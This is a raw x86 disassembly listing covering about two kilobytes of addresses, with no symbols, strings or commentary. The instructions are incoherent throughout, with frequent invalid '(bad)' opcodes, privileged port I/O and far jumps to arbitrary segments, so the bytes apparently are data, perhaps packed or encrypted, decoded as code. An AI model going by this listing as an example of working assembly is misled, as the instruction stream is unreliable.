  4110bf:	lods   al,BYTE PTR ds:[esi]
  4110c0:	ins    BYTE PTR es:[edi],dx
  4110c1:	retf   
  4110c2:	rcr    DWORD PTR [edi+ebp*4+0x4a],0x5e
  4110c7:	gs jle 0x411059
  4110ca:	pop    ds
  4110cb:	push   es
  4110cc:	stc    
  4110cd:	imul   ecx,eax,0x26
  4110d0:	out    dx,eax
  4110d1:	push   edx
  4110d2:	lods   al,BYTE PTR ds:[esi]
  4110d3:	repnz xchg edx,eax
  4110d5:	sti    
  4110d6:	push   es
  4110d7:	xchg   ebx,eax
  4110d8:	scas   al,BYTE PTR es:[edi]
  4110d9:	stos   BYTE PTR es:[edi],al
  4110da:	mov    dh,0xad
  4110dc:	adc    eax,0xef79afdf
  4110e1:	fs jb  0x4110c0
  4110e4:	outs   dx,DWORD PTR ds:[esi]
  4110e5:	scas   al,BYTE PTR es:[edi]
  4110e6:	loopne 0x41107c
  4110e8:	sub    bh,BYTE PTR [esi-0x79]
  4110eb:	cmp    al,0x19
  4110ed:	pop    ebx
  4110ee:	sahf   
  4110ef:	jbe    0x41115d
  4110f1:	dec    ecx
  4110f2:	mov    dl,0xbf
  4110f4:	lock int 0xe1
  4110f7:	or     DWORD PTR [edi-0x279c6ac0],ebp
  4110fd:	add    esi,DWORD PTR [ecx+0x6152f90f]
  411103:	data16 jmp 0x4110f7
  411106:	cmp    bh,BYTE PTR [edx+0x4b]
  411109:	test   BYTE PTR [esi],ah
  41110b:	and    DWORD PTR [edx-0x41ea9301],ecx
  411111:	mov    ch,0x35
  411113:	mov    WORD PTR [ecx+0x48],?
  411116:	mov    edi,0xbe542679
  41111b:	push   0xaac658b
  411120:	xchg   ecx,eax
  411121:	pop    eax
  411122:	ret    0xfae0
  411125:	adc    eax,0x314f0af9
  41112a:	popa   
  41112b:	push   esp
  41112c:	data16 sbb ch,dh
  41112f:	icebp  
  411130:	imul   edx,DWORD PTR [ebp+0x2d4fd281],0x228a91aa
  41113a:	mov    ds:0x9631c550,eax
  41113f:	in     al,dx
  411140:	and    DWORD PTR [ebx],eax
  411142:	fdivr  DWORD PTR [ebx]
  411144:	aas    
  411145:	mov    ds:0xcd6e850b,eax
  41114a:	fst    QWORD PTR [ebp-0x42ceea91]
  411150:	push   ecx
  411151:	dec    ecx
  411152:	cmp    eax,0x4cc3451
  411157:	(bad)  
  411159:	lock ins BYTE PTR es:[edi],dx
  41115b:	xchg   DWORD PTR [ecx-0x7573a664],ecx
  411161:	pop    ebp
  411162:	test   al,0xd5
  411164:	jae    0x41119a
  411166:	jo     0x411173
  411168:	sub    BYTE PTR [ecx],ch
  41116a:	cmp    dl,BYTE PTR [edi+0x4f60411e]
  411170:	cli    
  411171:	imul   ecx,edx,0x21
  411174:	add    dl,BYTE PTR [ebx-0x71ccc0a8]
  41117a:	mov    al,0xa8
  41117c:	push   0x6fcb28cc
  411181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411182:	push   ebp
  411183:	add    BYTE PTR [edx-0x6c8e85f2],0x13
  41118a:	sbb    esi,DWORD PTR [esi+0x33bb46dd]
  411190:	mov    al,0xa0
  411192:	jmp    0x411199
  411194:	dec    esi
  411195:	je     0x411165
  411197:	loopne 0x4111eb
  411199:	pop    ebp
  41119a:	inc    eax
  41119b:	add    ah,BYTE PTR [ebx+0x14f7f73f]
  4111a1:	mov    al,ds:0x451d143
  4111a6:	add    eax,esp
  4111a8:	xor    ch,BYTE PTR [ebp+0x28]
  4111ab:	mov    bl,0xab
  4111ad:	mov    edx,esp
  4111af:	imul   ebx,DWORD PTR [ebp-0x5],0xffffffa5
  4111b3:	es je  0x4111cf
  4111b6:	arpl   WORD PTR [ebp-0x1f99877e],cx
  4111bc:	sub    BYTE PTR [ecx+0x59],dl
  4111bf:	jmp    0x41116d
  4111c1:	lea    eax,[ecx+0x75]
  4111c4:	ins    DWORD PTR es:[edi],dx
  4111c5:	jp     0x411233
  4111c7:	dec    ecx
  4111c8:	outs   dx,BYTE PTR ds:[esi]
  4111c9:	aam    0x2e
  4111cb:	imul   esi,edx,0x9d95b0bf
  4111d1:	mov    eax,0xff534a3
  4111d6:	fisttp QWORD PTR [edi]
  4111d8:	or     BYTE PTR [esi],ah
  4111da:	inc    edi
  4111db:	inc    eax
  4111dc:	mov    ecx,DWORD PTR ds:0x26e1b48f
  4111e2:	xor    al,0xb1
  4111e4:	push   eax
  4111e5:	stc    
  4111e6:	jo     0x4111ab
  4111e8:	jge    0x411261
  4111ea:	pop    ebp
  4111eb:	mov    dl,0x3
  4111ed:	lods   eax,DWORD PTR ds:[esi]
  4111ee:	std    
  4111ef:	add    ch,BYTE PTR [edi-0x5436d106]
  4111f5:	hlt    
  4111f6:	fist   DWORD PTR [eax+0x6]
  4111f9:	outs   dx,DWORD PTR ds:[esi]
  4111fa:	ret    
  4111fb:	mov    esi,0x4ca16453
  411200:	repz dec edi
  411202:	push   ecx
  411203:	xchg   ebx,eax
  411204:	adc    al,ah
  411206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411207:	inc    esi
  411208:	test   al,0x9
  41120a:	mov    dl,0x55
  41120c:	add    al,0x6e
  41120e:	and    eax,0x47b22d31
  411213:	xchg   esp,eax
  411214:	aaa    
  411215:	(bad)  
  411216:	jae    0x41120a
  411218:	jno    0x4111ac
  41121a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41121b:	jecxz  0x411260
  41121d:	xor    BYTE PTR [ebp-0x43acfddd],0x7b
  411224:	mov    bl,0xcf
  411226:	jns    0x411239
  411228:	jne    0x41121d
  41122a:	lds    eax,FWORD PTR [edx+0x2c]
  41122d:	dec    ebx
  41122e:	dec    ecx
  41122f:	call   DWORD PTR [ebx+eax*8+0x33bd83b7]
  411236:	jo     0x4112b7
  411238:	pop    esi
  411239:	and    dh,0xe0
  41123c:	push   0x915aa9dc
  411241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411242:	xlat   BYTE PTR ds:[ebx]
  411243:	jae    0x411226
  411245:	and    esi,DWORD PTR ss:[ecx]
  411248:	sub    eax,ebx
  41124a:	jle    0x4111e4
  41124c:	cmp    DWORD PTR [eax],esi
  41124e:	adc    ebx,DWORD PTR [ecx+0x551f3d9c]
  411254:	jg     0x411268
  411256:	stc    
  411257:	test   al,0x4b
  411259:	test   al,0xae
  41125b:	dec    eax
  41125c:	pop    ebx
  41125d:	hlt    
  41125e:	push   ds
  41125f:	pop    eax
  411260:	aam    0x2b
  411262:	xchg   edx,eax
  411263:	in     al,dx
  411264:	pusha  
  411265:	push   edx
  411266:	mov    BYTE PTR [esp+ebx*2],bh
  411269:	in     al,dx
  41126a:	cmp    eax,0x49e3e8c4
  41126f:	fwait
  411270:	(bad)  
  411271:	enter  0xc7f4,0x95
  411275:	xchg   edi,eax
  411276:	mov    edi,0xcf16d384
  41127b:	adc    eax,0x89a01663
  411280:	in     al,dx
  411281:	cmc    
  411282:	xor    DWORD PTR [eax],ecx
  411284:	mov    eax,DWORD PTR [edi+0x1315d1ee]
  41128a:	shl    DWORD PTR [edi],cl
  41128c:	jno    0x411242
  41128e:	push   eax
  41128f:	(bad)  
  411290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411291:	cmc    
  411292:	retf   
  411293:	ja     0x41121f
  411295:	or     ah,dh
  411297:	(bad)  
  411298:	dec    esp
  411299:	cmp    BYTE PTR [ecx+0x4e],0x3e
  41129d:	arpl   WORD PTR [edx+0x6e],ax
  4112a0:	push   0xffffffe5
  4112a2:	inc    esi
  4112a3:	fadd   DWORD PTR [edi+0x741bb2cc]
  4112a9:	or     al,0x65
  4112ab:	xor    esp,esi
  4112ad:	xor    dh,BYTE PTR [edi+0x35]
  4112b0:	mov    cl,0xc5
  4112b2:	and    al,0x35
  4112b4:	adc    al,0xf1
  4112b6:	inc    ecx
  4112b7:	(bad)  
  4112b8:	cwde   
  4112b9:	test   al,0xb
  4112bb:	jl     0x41128a
  4112bd:	js     0x411294
  4112bf:	push   edi
  4112c0:	int    0x53
  4112c2:	jle    0x4112a6
  4112c4:	mov    eax,ds:0xd5e271a5
  4112c9:	gs add al,0xf7
  4112cd:	cmp    al,0x4d
  4112cf:	ret    
  4112d0:	mov    al,ds:0xecd28fd0
  4112d5:	push   0xffffff90
  4112d7:	fist   DWORD PTR [edi]
  4112d9:	mov    esp,0x4c79cba6
  4112de:	stc    
  4112df:	pusha  
  4112e0:	std    
  4112e1:	outs   dx,BYTE PTR ds:[esi]
  4112e2:	icebp  
  4112e3:	retf   0xcf5b
  4112e6:	fnsetpm(287 only) 
  4112e8:	xor    eax,0xb8b0a8b0
  4112ed:	mov    BYTE PTR [edx+0x62],bh
  4112f0:	out    0xeb,eax
  4112f2:	lods   eax,DWORD PTR ds:[esi]
  4112f3:	and    al,0xc9
  4112f5:	inc    ecx
  4112f6:	push   ds
  4112f7:	mov    ds:0x48d08ccc,eax
  4112fc:	inc    ebx
  4112fd:	sahf   
  4112fe:	stc    
  4112ff:	sbb    ebx,DWORD PTR [esi+0x72504c09]
  411305:	call   0x3fc67b6c
  41130a:	rol    DWORD PTR [edi],0xfb
  41130d:	jle    0x4112ac
  41130f:	inc    esp
  411310:	cwde   
  411311:	xor    al,0xec
  411313:	inc    edi
  411314:	mov    eax,0x7cc3f6b6
  411319:	retf   
  41131a:	xchg   edx,eax
  41131b:	aaa    
  41131c:	mov    cl,0x65
  41131e:	mov    esp,0xe9a49b41
  411323:	or     ah,dl
  411325:	adc    edx,DWORD PTR [ebx+0x4b]
  411328:	mov    ebp,0x5423eee7
  41132d:	mov    eax,ds:0x9b7ca625
  411332:	inc    edx
  411333:	mov    DWORD PTR [ecx],eax
  411335:	or     al,0x3b
  411337:	push   edx
  411338:	imul   eax,ecx,0xd7b1a115
  41133e:	stos   BYTE PTR es:[edi],al
  41133f:	sbb    al,0x19
  411341:	adc    al,0x68
  411343:	jb     0x411306
  411345:	pusha  
  411346:	sub    ecx,DWORD PTR [edi+ebp*2]
  411349:	sbb    BYTE PTR [ebx-0x80],bl
  41134c:	xchg   ecx,eax
  41134d:	push   esp
  41134e:	aaa    
  41134f:	push   ecx
  411350:	dec    edi
  411351:	sar    dh,cl
  411353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411354:	fld    TBYTE PTR [ebp+0x7fbcb642]
  41135a:	add    al,0xd1
  41135c:	inc    eax
  41135d:	mov    cl,0x9c
  41135f:	repz add eax,0xa780aaaf
  411365:	test   al,0x55
  411367:	xor    eax,0xe8d53146
  41136c:	or     DWORD PTR [ebp+0x28],ebx
  41136f:	ss in  eax,0xe3
  411372:	mov    fs,ebp
  411374:	test   al,0x6b
  411376:	push   es
  411377:	repnz xchg edi,eax
  411379:	adc    al,0x67
  41137b:	cdq    
  41137c:	retf   0x1294
  41137f:	pop    edx
  411380:	pop    edi
  411381:	cs inc edx
  411383:	in     eax,0xc6
  411385:	(bad)  
  411386:	mov    ebx,0x1f355ded
  41138b:	xor    al,dl
  41138d:	aam    0x73
  41138f:	addr16 stc 
  411391:	cmp    eax,0xa96ff0c6
  411396:	lock jbe 0x4113a1
  411399:	ror    BYTE PTR [edi+0x1e],1
  41139c:	popf   
  41139d:	fisttp QWORD PTR [ecx]
  41139f:	push   ebp
  4113a1:	jmp    0x861:0x3283ad31
  4113a8:	aad    0x3e
  4113aa:	and    dh,BYTE PTR [ebp-0x16]
  4113ad:	or     al,0xe9
  4113af:	cdq    
  4113b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113b1:	dec    ebp
  4113b2:	arpl   WORD PTR [edi-0x316d4765],bx
  4113b8:	xchg   ebx,eax
  4113b9:	adc    ah,BYTE PTR [edi-0xf]
  4113bc:	in     eax,0x89
  4113be:	or     eax,DWORD PTR [ebx]
  4113c0:	adc    ch,BYTE PTR es:[edx]
  4113c3:	push   cs
  4113c4:	lods   eax,DWORD PTR es:[esi]
  4113c6:	or     al,0xaa
  4113c8:	icebp  
  4113c9:	mov    ebp,0xce2ee079
  4113ce:	in     eax,dx
  4113cf:	loopne 0x4113fe
  4113d1:	rcl    BYTE PTR [ecx-0x54],0xbe
  4113d5:	sbb    edx,ebp
  4113d7:	lods   eax,DWORD PTR ds:[esi]
  4113d8:	pushf  
  4113d9:	pop    esi
  4113da:	xor    DWORD PTR [edx+0x50],esp
  4113dd:	fs pop ebx
  4113df:	push   eax
  4113e0:	scas   eax,DWORD PTR es:[edi]
  4113e1:	jg     0x41137c
  4113e3:	adc    cl,BYTE PTR [edx-0x75434b18]
  4113e9:	xor    al,BYTE PTR [ebx-0x613abb85]
  4113ef:	jns    0x41142b
  4113f1:	test   eax,0xd73b4e89
  4113f6:	xchg   bh,ch
  4113f8:	and    DWORD PTR [edx-0x1],ecx
  4113fb:	icebp  
  4113fc:	call   0xe60a:0xe8dba4e4
  411403:	jns    0x411413
  411405:	test   DWORD PTR [edi-0x5c2fa530],esp
  41140b:	mov    edi,0xeb6e52d0
  411410:	cli    
  411411:	cmp    al,0xc9
  411413:	xchg   edi,edi
  411415:	xchg   ebp,eax
  411416:	cli    
  411417:	and    DWORD PTR [ebp-0x1b],eax
  41141a:	std    
  41141b:	inc    edi
  41141c:	push   edi
  41141d:	or     eax,0xd3869cc1
  411422:	mov    dh,0x61
  411424:	ds push ss
  411426:	push   esi
  411427:	mov    dh,0xce
  411429:	xchg   esi,eax
  41142a:	dec    ebp
  41142b:	test   DWORD PTR [eax-0x75e98a24],ebp
  411431:	mov    dh,0x45
  411433:	xchg   edx,eax
  411434:	fstp   QWORD PTR [ebp-0x4d]
  411437:	call   0xdf23ae72
  41143c:	ror    DWORD PTR [ecx-0x69],0x55
  411440:	dec    esi
  411441:	push   ss
  411442:	test   BYTE PTR [edx],0x3d
  411445:	or     eax,0x1847b76b
  41144a:	xor    BYTE PTR [edx-0x2],bl
  41144d:	push   0x8959e0ba
  411452:	ror    esi,0x7f
  411455:	add    edi,0xffffffed
  411458:	call   0x50bc:0xf8484232
  41145f:	xor    al,0x34
  411461:	mov    esi,0x6065c1e6
  411466:	xchg   ebp,ebp
  411468:	mov    bl,0x8a
  41146a:	lea    edi,[edi]
  41146c:	push   esi
  41146d:	jo     0x411456
  41146f:	lahf   
  411470:	(bad)  
  411471:	mov    esi,0xf330f8de
  411476:	push   0x9096844f
  41147b:	xchg   ebx,eax
  41147c:	xchg   BYTE PTR [edx+0x401de8b6],ch
  411482:	retf   0x2785
  411485:	jmp    0x5f43:0xb6e87cc6
  41148c:	and    BYTE PTR [ebp-0x4b],0xab
  411490:	gs das 
  411492:	add    edi,eax
  411494:	mov    fs,ebp
  411496:	daa    
  411497:	mov    esi,0x5b547812
  41149c:	sub    eax,0x7c960c38
  4114a1:	dec    ebp
  4114a2:	imul   ebp,esp,0xd69f1c15
  4114a8:	push   0xffffffcf
  4114aa:	dec    esi
  4114ab:	stc    
  4114ac:	test   eax,0x2bd09fdc
  4114b1:	sbb    bl,BYTE PTR [eax-0x9]
  4114b4:	inc    edi
  4114b5:	jmp    0x41148a
  4114b7:	cmp    bl,BYTE PTR [edx+ebp*2-0x78]
  4114bb:	shl    BYTE PTR [esi+0xa],cl
  4114be:	pusha  
  4114bf:	and    BYTE PTR [edx-0x31ab4a6b],bh
  4114c5:	rcl    BYTE PTR [edi-0x72],1
  4114c8:	call   0x4450:0xade20a9
  4114cf:	aad    0x2c
  4114d1:	(bad)  
  4114d3:	psubq  mm6,QWORD PTR [edx+0x724dd6e5]
  4114da:	mov    edi,0xf7b18eae
  4114df:	mov    esp,DWORD PTR [ecx]
  4114e1:	repnz call 0x9780:0xeb56937
  4114e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114ea:	mov    dl,0xaf
  4114ec:	es das 
  4114ee:	mov    ss,WORD PTR [esp+ebp*1+0x13751730]
  4114f5:	jae    0x4114e8
  4114f7:	or     BYTE PTR [edi+0x695b3c7d],al
  4114fd:	push   eax
  4114fe:	xchg   esp,eax
  4114ff:	push   ds
  411500:	fcmove st,st(3)
  411502:	add    eax,0x4be73b46
  411507:	js     0x4114ec
  411509:	dec    eax
  41150a:	pop    ds
  41150b:	stc    
  41150c:	pop    eax
  41150d:	xchg   esi,eax
  41150e:	mov    eax,ds:0x7c175ada
  411513:	jg     0x411578
  411515:	push   edi
  411516:	push   ebx
  411517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411518:	jns    0x4114eb
  41151a:	cwde   
  41151b:	add    ah,BYTE PTR ds:0x399ae70
  411521:	jge    0x411523
  411523:	shr    esi,cl
  411525:	retf   0x7b59
  411528:	cwde   
  411529:	stc    
  41152a:	sbb    ecx,DWORD PTR [ecx]
  41152c:	fisttp QWORD PTR [esi-0x10]
  41152f:	pop    ebp
  411530:	sahf   
  411531:	js     0x411536
  411533:	add    DWORD PTR [edi-0x26],esp
  411536:	sbb    BYTE PTR [ecx-0x5fd7d447],al
  41153c:	(bad)  
  41153d:	shl    BYTE PTR [esi],0x39
  411540:	aam    0x46
  411542:	fsub   DWORD PTR [edx-0x67cf605f]
  411548:	mov    bh,0xe
  41154a:	es das 
  41154c:	sbb    eax,0x6e92f00f
  411551:	xchg   ebp,eax
  411552:	pop    edi
  411553:	xor    DWORD PTR [edi],ecx
  411555:	pop    ds
  411556:	inc    eax
  411557:	push   ds
  411558:	aas    
  411559:	fmul   DWORD PTR [edi-0x6e38aeb0]
  41155f:	call   0x2d8d:0xcb5dc263
  411566:	mov    ds,WORD PTR [ebx]
  411568:	or     eax,0x2332366d
  41156d:	push   ebp
  41156e:	push   ss
  41156f:	push   cs
  411570:	add    bl,bl
  411572:	add    ah,dl
  411574:	add    eax,0x31d9091d
  411579:	jns    0x411579
  41157b:	pop    ebp
  41157c:	addr16 inc esi
  41157e:	xchg   DWORD PTR [esi],esi
  411580:	fstp   TBYTE PTR [ebx-0x72]
  411583:	sbb    ebp,DWORD PTR [ebx+ecx*2-0x9]
  411587:	repz in al,0xf3
  41158a:	add    DWORD PTR [ecx-0x6fb2a9b1],0x25
  411591:	pop    eax
  411592:	in     al,0x43
  411594:	fnstenv [esi+edi*8+0x29858b07]
  41159b:	scas   al,BYTE PTR es:[edi]
  41159c:	pop    edx
  41159d:	scas   al,BYTE PTR es:[edi]
  41159e:	mov    dh,0xa6
  4115a0:	jl     0x4115b1
  4115a2:	pcmpeqb mm3,mm7
  4115a5:	mov    ebx,0xcfa4eec9
  4115aa:	cs add eax,0xf56af2ce
  4115b0:	repz adc ecx,0x7dd76bd6
  4115b7:	lock out 0x52,eax
  4115ba:	jnp    0x411577
  4115bc:	loope  0x41160f
  4115be:	sbb    ch,bh
  4115c0:	sbb    bh,0x94
  4115c3:	aad    0x34
  4115c5:	and    ecx,eax
  4115c7:	sti    
  4115c8:	pop    edi
  4115c9:	je     0x4115f0
  4115cb:	jae    0x411617
  4115cd:	(bad)  
  4115ce:	jle    0x41161c
  4115d0:	(bad)  
  4115d1:	ds xchg esi,eax
  4115d3:	rcr    DWORD PTR [esi],0xe9
  4115d6:	sti    
  4115d7:	jno    0x4115c2
  4115d9:	loop   0x41160e
  4115db:	cmp    BYTE PTR [esi-0x7c],bl
  4115de:	inc    esi
  4115df:	imul   edi,edi,0x7f090d27
  4115e5:	dec    esi
  4115e6:	or     edx,edx
  4115e8:	pushf  
  4115e9:	cmp    edx,DWORD PTR [ebx+0x68]
  4115ec:	repnz vmaxsd xmm1,xmm2,QWORD PTR [esi+0x2e]
  4115f2:	pop    eax
  4115f3:	jmp    0x41162a
  4115f5:	jecxz  0x4115de
  4115f7:	fbstp  TBYTE PTR [ecx+0x36]
  4115fa:	mov    eax,ds:0x151085c
  4115ff:	retf   
  411600:	adc    BYTE PTR [ecx],ch
  411602:	ret    
  411603:	mov    esi,0xe219b626
  411608:	mov    ds:0xdccb2da2,eax
  41160d:	out    dx,al
  41160e:	adc    dl,BYTE PTR [esi]
  411610:	sub    BYTE PTR [edx-0x59],0xc7
  411614:	pop    eax
  411615:	add    esi,DWORD PTR [esi+esi*1-0x51e2e15c]
  41161c:	out    dx,eax
  41161d:	inc    ebx
  41161e:	push   ecx
  41161f:	outs   dx,BYTE PTR ds:[esi]
  411620:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411621:	jnp    0x411668
  411623:	lock sbb ch,bh
  411626:	mov    ds:0xd7600a11,al
  41162b:	clc    
  41162c:	mov    bh,0x4c
  41162e:	pop    edx
  41162f:	cmc    
  411630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411631:	xchg   ecx,eax
  411632:	jae    0x4115fc
  411634:	lds    edi,FWORD PTR [ebp+esi*2+0x13]
  411638:	in     al,dx
  411639:	jno    0x411656
  41163b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41163c:	fsub   QWORD PTR [ebx+0x62]
  41163f:	loopne 0x4115cf
  411641:	mov    esi,edi
  411643:	jge    0x411636
  411645:	mov    esi,0xa729e804
  41164a:	ins    BYTE PTR es:[edi],dx
  41164b:	cld    
  41164c:	fist   WORD PTR [ecx-0x11]
  41164f:	xchg   WORD PTR [esp+edx*8],dx
  411653:	int    0xcb
  411655:	lahf   
  411656:	fistp  DWORD PTR [ebx+0x5af858cc]
  41165c:	js     0x411651
  41165e:	sar    DWORD PTR [ebx+0x1d2b1f28],cl
  411664:	cdq    
  411665:	sbb    eax,0x72ca7051
  41166a:	iret   
  41166b:	clc    
  41166c:	jbe    0x4116ab
  41166e:	iret   
  41166f:	push   0xe1ca4b39
  411674:	repz xchg edi,eax
  411676:	pop    edx
  411677:	je     0x411682
  411679:	adc    BYTE PTR [eax],ch
  41167b:	pop    ecx
  41167c:	ins    DWORD PTR es:[edi],dx
  41167d:	rol    al,cl
  41167f:	or     BYTE PTR [ebx+0x71cd31e0],0x9c
  411686:	iret   
  411687:	sub    al,0x9e
  411689:	xchg   BYTE PTR [eax-0x692ea99],cl
  41168f:	cmp    BYTE PTR [edi+0x670058b9],dl
  411695:	mov    esp,0x7d7d8189
  41169a:	pop    eax
  41169b:	mov    eax,DWORD PTR [ebx+edi*8+0x46]
  41169f:	xchg   esi,eax
  4116a0:	pop    ss
  4116a1:	push   0xffffffc0
  4116a3:	(bad)  
  4116a4:	out    dx,al
  4116a5:	xchg   ecx,eax
  4116a6:	pop    ecx
  4116a7:	mov    dh,0x52
  4116a9:	and    eax,DWORD PTR [edx-0x5fe8be0a]
  4116af:	pop    edi
  4116b0:	imul   esp,DWORD PTR [eax+0x238d1a35],0x42
  4116b7:	adc    eax,0x79147b3d
  4116bc:	cmp    edx,edi
  4116be:	and    DWORD PTR [ebx],esi
  4116c0:	sub    al,0x96
  4116c2:	imul   DWORD PTR ds:0x8afe2727
  4116c8:	sbb    ebx,DWORD PTR [edx+0x23b4a5b5]
  4116ce:	call   0xab13:0x59f30275
  4116d5:	js     0x411708
  4116d7:	jmp    0x9c25:0x4e64248c
  4116de:	push   ecx
  4116df:	in     eax,0x11
  4116e1:	fisubr WORD PTR [edx-0x18]
  4116e4:	cmp    al,0x78
  4116e6:	sbb    al,0x55
  4116e8:	xchg   esi,eax
  4116e9:	jb     0x4116c8
  4116eb:	add    bh,BYTE PTR [esi+edx*8]
  4116ee:	jno    0x411712
  4116f0:	mov    BYTE PTR [edx-0x1c],dh
  4116f3:	xchg   ebx,eax
  4116f4:	das    
  4116f5:	sub    DWORD PTR [edi],eax
  4116f7:	xchg   esi,eax
  4116f8:	stos   BYTE PTR es:[edi],al
  4116f9:	pop    ds
  4116fa:	mov    ebx,0x856f789b
  4116ff:	or     DWORD PTR [esi-0x6723fb48],edi
  411705:	(bad)  
  411706:	pop    edi
  411707:	add    al,0x27
  411709:	popf   
  41170a:	mov    eax,ds:0x4bb98edf
  41170f:	dec    ebp
  411710:	sub    BYTE PTR [edi-0x412841fa],0x63
  411717:	push   ds
  411718:	and    ebx,DWORD PTR [ecx-0x6646ab70]
  41171e:	xchg   edi,eax
  41171f:	add    esi,DWORD PTR [ecx-0x3]
  411722:	xchg   esi,eax
  411723:	sub    al,BYTE PTR [edi+0x6c]
  411726:	loop   0x411727
  411728:	hlt    
  411729:	pmaddwd mm1,mm1
  41172c:	pusha  
  41172d:	repz xlat BYTE PTR ds:[ebx]
  41172f:	and    esp,esp
  411731:	popf   
  411732:	dec    esp
  411733:	push   0xffffff9a
  411735:	push   ebp
  411736:	popf   
  411737:	shr    bh,0xc6
  41173a:	jmp    0x6e54:0x9e872848
  411741:	das    
  411742:	(bad)  
  411743:	aad    0x92
  411745:	add    ah,dl
  411747:	dec    ecx
  411748:	sub    eax,0xeed93b6b
  41174d:	jno    0x411785
  41174f:	sub    esp,DWORD PTR [edx+0x5235e0c4]
  411755:	pop    ss
  411756:	xor    dh,BYTE PTR [ecx-0x7460450]
  41175c:	fwait
  41175d:	inc    esi
  41175e:	and    bh,BYTE PTR [esi+0x3efaa143]
  411764:	sub    BYTE PTR [eax+0x8],ch
  411767:	and    ebx,DWORD PTR [eax+0x5b]
  41176a:	and    al,0x13
  41176c:	fnstcw WORD PTR [eax+0x4cc4b2f4]
  411772:	popf   
  411773:	adc    al,0xe3
  411775:	mov    edx,fs
  411777:	loop   0x4117ef
  411779:	jnp    0x411730
  41177b:	popf   
  41177c:	stos   DWORD PTR es:[edi],eax
  41177d:	dec    esi
  41177e:	pop    ebx
  41177f:	adc    DWORD PTR [esi],ebp
  411781:	jmp    0x411755
  411783:	data16 stc 
  411785:	xor    al,0xf6
  411787:	jge    0x4117be
  411789:	pop    es
  41178a:	neg    edi
  41178c:	inc    esi
  41178d:	les    ecx,FWORD PTR [ebp+eiz*2-0x9]
  411791:	ins    BYTE PTR es:[edi],dx
  411792:	inc    eax
  411793:	shl    BYTE PTR [esi-0x70b4a540],0x5f
  41179a:	mov    cl,0xfa
  41179c:	xchg   esp,eax
  41179d:	out    0x51,al
  41179f:	das    
  4117a0:	dec    ecx
  4117a1:	push   ebx
  4117a2:	ja     0x4117c8
  4117a4:	nop
  4117a5:	add    ch,BYTE PTR [ebx+0x1f]
  4117a8:	das    
  4117a9:	add    bl,BYTE PTR [ebx+0x42f01b24]
  4117af:	lds    edi,FWORD PTR [esi+0x52]
  4117b2:	jb     0x411790
  4117b4:	and    al,0x63
  4117b6:	mov    edi,fs
  4117b8:	mov    al,0xac
  4117ba:	mov    esp,0x6999e033
  4117bf:	pop    eax
  4117c0:	mov    ?,ebx
  4117c2:	sahf   
  4117c3:	in     eax,dx
  4117c4:	mov    ch,0x2e
  4117c6:	inc    esp
  4117c7:	jge    0x411826
  4117c9:	xchg   ecx,ebp
  4117cb:	mov    ebx,0x9bbe60ab
  4117d0:	out    dx,al
  4117d1:	mov    al,0x6a
  4117d3:	inc    ecx
  4117d4:	and    DWORD PTR es:[edi-0x69],edi
  4117d8:	es loope 0x4117c5
  4117db:	cmp    eax,0x3512795
  4117e0:	cmc    
  4117e1:	mov    cl,0x4d
  4117e3:	sub    al,0x61
  4117e5:	sub    BYTE PTR [edx-0x25],0x59
  4117e9:	add    al,BYTE PTR [ebx]
  4117eb:	jmp    0x22642db2
  4117f0:	cli    
  4117f1:	cmp    bh,BYTE PTR [ecx-0x647e8a6f]
  4117f7:	outs   dx,DWORD PTR ds:[esi]
  4117f8:	inc    eax
  4117f9:	or     edx,esi
  4117fb:	aad    0xda
  4117fd:	std    
  4117fe:	shl    DWORD PTR [edi],0x4
  411801:	mov    BYTE PTR [ebx+0x71df0773],al
  411807:	mov    edi,0xed6f1a4f
  41180c:	mov    ch,0xcd
  41180e:	clc    
  41180f:	out    0x4f,eax
  411811:	lea    esp,[esi-0x3]
  411814:	adc    DWORD PTR [ebx],0xe
  411817:	inc    eax
  411818:	ror    DWORD PTR [ecx],cl
  41181a:	dec    ecx
  41181b:	imul   esi,esp,0x1dcb200b
  411821:	jge    0x41188b
  411823:	sbb    ecx,edi
  411825:	cwde   
  411826:	fs pop eax
  411828:	jle    0x41182c
  41182a:	test   al,0x9e
  41182c:	es ins BYTE PTR es:[edi],dx
  41182e:	jl     0x41186a
  411830:	sbb    DWORD PTR [esi],ebp
  411832:	rep ins DWORD PTR es:[edi],dx
  411834:	push   es
  411835:	int    0x39
  411837:	xchg   esi,eax
  411838:	push   ds
  411839:	mov    ebx,0x5bf1fc99
  41183e:	inc    edi
  41183f:	pop    esp
  411840:	jl     0x41189c
  411842:	mov    al,ds:0xc323fb7d
  411847:	sub    BYTE PTR [ecx+0x77],al
  41184a:	fisubr WORD PTR [ebp+0x3c]
  41184d:	and    eax,0x8254fcbc
  411852:	(bad)  
  411853:	jmp    0x8ce4:0x21e91c24
  41185a:	adc    edi,DWORD PTR [edx]
  41185c:	ja     0x411880
  41185e:	add    BYTE PTR [esi-0x6300454],ah
  411864:	xor    esp,edx
  411866:	dec    BYTE PTR [ebp+0x5e090bc8]
  41186c:	into   
  41186d:	scas   eax,DWORD PTR es:[edi]
  41186e:	inc    ebx
  41186f:	or     DWORD PTR [ebx],ebp
  411871:	(bad)
  411874:	cli    
  411875:	adc    ecx,ecx
  411877:	push   edx
  411878:	cmp    eax,0x90d6e315
  41187d:	fidivr DWORD PTR [eax]
  41187f:	inc    ebx
  411880:	outs   dx,BYTE PTR ds:[esi]
  411881:	outs   dx,DWORD PTR ds:[esi]
  411882:	aaa    
  411883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411884:	push   cs
  411885:	ret    0xe304
  411888:	repz sub DWORD PTR [esi],esp
  41188b:	(bad)  
  41188c:	stos   BYTE PTR es:[edi],al
  41188d:	jns    0x41190b
  41188f:	jnp    0x4118f0
  411891:	adc    DWORD PTR [ecx],0x8c0082c3
  411897:	fidiv  DWORD PTR [edx]
  411899:	xchg   ebx,eax
